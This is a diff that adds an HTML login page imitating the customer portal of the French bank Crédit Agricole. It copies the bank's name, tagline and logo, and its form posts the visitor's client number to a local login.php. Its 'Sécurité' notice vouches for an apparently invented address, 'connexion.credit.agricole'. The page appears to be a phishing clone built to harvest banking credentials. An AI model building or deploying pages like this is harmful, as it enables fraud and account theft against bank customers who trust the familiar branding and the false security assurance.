@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CREDIT AGRICOLE - Espace Client</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <img src="image/credit-agricole-logo.png" alt="">
+                <span class="logo-text">CREDIT AGRICOLE</span>
+            </div>
+            <p class="tagline">La banque d'un monde qui change</p>
+        </header>
+
+        <main class="main-content">
+            <div class="login-card">
+                <h1>Accédez à notre espace client</h1>
+                
+                <form id="loginForm" action="login.php" method="POST">
+                    <div class="form-group">
+                        <label for="clientNumber">Numéro Client</label>
+                        <div class="input-wrapper">
+                            <input 
+                                type="text" 
+                                id="clientNumber" 
+                                name="clientNumber" 
+                                placeholder="Numéro de 2 à 10 chiffres"
+                                required
+                            >
+                            <button type="button" class="change-btn">Changer</button>
+                        </div>
+                    </div>
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="remember" name="remember">
+                        <label for="remember">Mémoriser mon numéro client</label>
+                    </div>
+
+                    <button type="submit" class="continue-btn">Continuer</button>
+
+                    <a href="#" class="help-link">Identifiant oublié ou compte bloqué</a>
+                </form>
+            </div>
+
+            <div class="security-info">
+                <div class="security-header">
+                    <span class="lock-icon">🔒</span>
+                    <h2>Sécurité</h2>
+                </div>
+                <p class="security-subtitle">connexion.credit.agricole</p>
+                <p class="security-text">
+                    Avant de vous connecter, vérifiez que l'adresse de cette page commence 
+                    exactement par l'URL ci-dessus. Si elle présente une anomalie, 
+                    nous vous demandons de ne pas poursuivre.
+                </p>
+                <div class="help-section">
+                    <h3>Besoin d'aide ?</h3>
+                    <a href="#" class="help-link-secondary">Consultez notre</a>
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <a href="#">Espace sécurisé</a>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
